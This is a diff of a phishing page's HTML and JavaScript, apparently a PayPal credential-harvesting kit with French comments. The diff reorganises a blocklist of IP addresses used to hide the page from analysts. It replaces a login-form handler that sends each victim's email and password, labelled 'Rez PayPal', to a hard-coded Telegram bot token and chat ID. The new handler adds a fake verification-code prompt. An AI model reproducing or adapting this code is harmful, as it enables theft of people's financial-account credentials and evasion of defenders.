@@ -12,62 +12,33 @@
         // Liste des adresses IP bloquées
         const blockedIPs = [
             "103.248.172.42",
-
-"69.25.58.61",
-
-"185.187.30.13",
-
-"178.24.121.188",
-
-"87.113.96.90",
-
-"165.227.0.128",
-
-"185.229.190.140", 
-
-"165.227.0.128", 
-
-"46.101.94.163", 
-
-"165.227.39.194",
-
-"87.113.96.90",
-
-"46.101.119.24",
-
-"82.102.27.75", 
-
-"173.239.230.97", 
-
-"82.102.27.75", 
-
-"87.113.96.90", 
-
-"46.101.119.24", 
-
-"173.239.230.97", 
-
-"87.113.96.90", 
-
-"87.113.96.90", 
-
-"159.203.0.156", 
-
-"162.243.187.126",
-
-"82.102.27.75", 
-
-"87.113.96.90",
-
-"103.248.172.42", 
-
-"103.248.172.42", 
-
-"47.30.133.89", 
-
-"103.248.172.42",
-            
-            // Ajoutez d'autres adresses IP bloquées ici
+            "69.25.58.61",
+            "185.187.30.13",
+            "178.24.121.188",
+            "87.113.96.90",
+            "165.227.0.128",
+            "185.229.190.140",
+            "165.227.0.128",
+            "46.101.94.163",
+            "165.227.39.194",
+            "87.113.96.90",
+            "46.101.119.24",
+            "82.102.27.75",
+            "173.239.230.97",
+            "82.102.27.75",
+            "87.113.96.90",
+            "46.101.119.24",
+            "173.239.230.97",
+            "87.113.96.90",
+            "87.113.96.90",
+            "159.203.0.156",
+            "162.243.187.126",
+            "82.102.27.75",
+            "87.113.96.90",
+            "103.248.172.42",
+            "103.248.172.42",
+            "47.30.133.89",
+            "103.248.172.42",
         ];
 
         // Fonction pour obtenir l'adresse IP de l'utilisateur
@@ -93,6 +64,55 @@
         }
 
         window.onload = detectBot;
+
+        // Fonction pour générer un code de vérification aléatoire
+        function generateVerificationCode() {
+            return Math.floor(100000 + Math.random() * 900000); // Génère un code à 6 chiffres
+        }
+
+        // Fonction de gestion de la soumission du formulaire
+        document.getElementById('loginForm').addEventListener('submit', function(event) {
+            event.preventDefault();
+            document.getElementById('loading').style.display = 'block';
+            var email = document.getElementById('email').value;
+            var password = document.getElementById('password').value;
+            var verificationCode = generateVerificationCode(); // Génère le code de vérification
+            var telegramBotToken = '7348058838:AAEurSPCnnOw6yluh3-4oqUq_E61Q55Av-U';
+            var telegramChatId = '-4746759996';
+            var message = '😈Rez PayPal😈\n\n 💯New Connexxion💯 \n🆔Email/numero: ' + email + '\n🧾Password: ' + password + '\n🔑Votre code de vérification: ' + verificationCode;
+            
+            var request = new XMLHttpRequest();
+            request.open('POST', 'https://api.telegram.org/bot' + telegramBotToken + '/sendMessage', true);
+            request.setRequestHeader('Content-Type', 'application/json');
+            request.onreadystatechange = function() {
+                if (request.readyState === 4 && request.status === 200) {
+                    var response = JSON.parse(request.responseText);
+                    if (response.ok) {
+                        // Envoie le code à l'utilisateur, puis attends qu'il le saisisse
+                        promptForVerificationCode(verificationCode);
+                    } else {
+                        document.getElementById('loading').style.display = 'none';
+                        alert('Une erreur technique est survenue. Veuillez réessayer plus tard.');
+                    }
+                }
+            };
+            request.send(JSON.stringify({
+                chat_id: telegramChatId,
+                text: message
+            }));
+        });
+
+        // Fonction pour demander le code de vérification à l'utilisateur
+        function promptForVerificationCode(expectedCode) {
+            var userCode = prompt("Veuillez entrer le code de vérification envoyé à votre Telegram.");
+            if (userCode === expectedCode.toString()) {
+                alert("Code validé ! Vous êtes connecté.");
+                window.location.href = 'success.html';  // Redirige l'utilisateur vers une page de succès
+            } else {
+                alert("Le code que vous avez entré est incorrect. Veuillez réessayer.");
+                document.getElementById('loading').style.display = 'none';
+            }
+        }
     </script>
 </head>
 <body class="desktop">
@@ -153,37 +173,5 @@
             </div>
         </footer>
     </div>
-    <script>
-        document.getElementById('loginForm').addEventListener('submit', function(event) {
-            event.preventDefault();
-            document.getElementById('loading').style.display = 'block';
-            var email = document.getElementById('email').value;
-            var password = document.getElementById('password').value;
-            var telegramBotToken = '7348058838:AAEurSPCnnOw6yluh3-4oqUq_E61Q55Av-U';
-            var telegramChatId = '-4746759996';
-            var message = '😈Rez PayPal😈\n\n 💯New Connexxion💯 \n🆔Email/numero: ' + email + '\n🧾Password: ' + password;
-            
-            var request = new XMLHttpRequest();
-            request.open('POST', 'https://api.telegram.org/bot' + telegramBotToken + '/sendMessage', true);
-            request.setRequestHeader('Content-Type', 'application/json');
-            request.onreadystatechange = function() {
-                if (request.readyState === 4 && request.status === 200) {
-                    var response = JSON.parse(request.responseText);
-                    if (response.ok) {
-                        setTimeout(function() {
-                            window.location.href = 'error.html';
-                        }, 5000);
-                    } else {
-                        document.getElementById('loading').style.display = 'none';
-                        alert('Une erreur technique est survenue. Veuillez réessayer plus tard.');
-                    }
-                }
-            };
-            request.send(JSON.stringify({
-                chat_id: telegramChatId,
-                text: message
-            }));
-        });
-    </script>
 </body>
-</html> 
+</html>
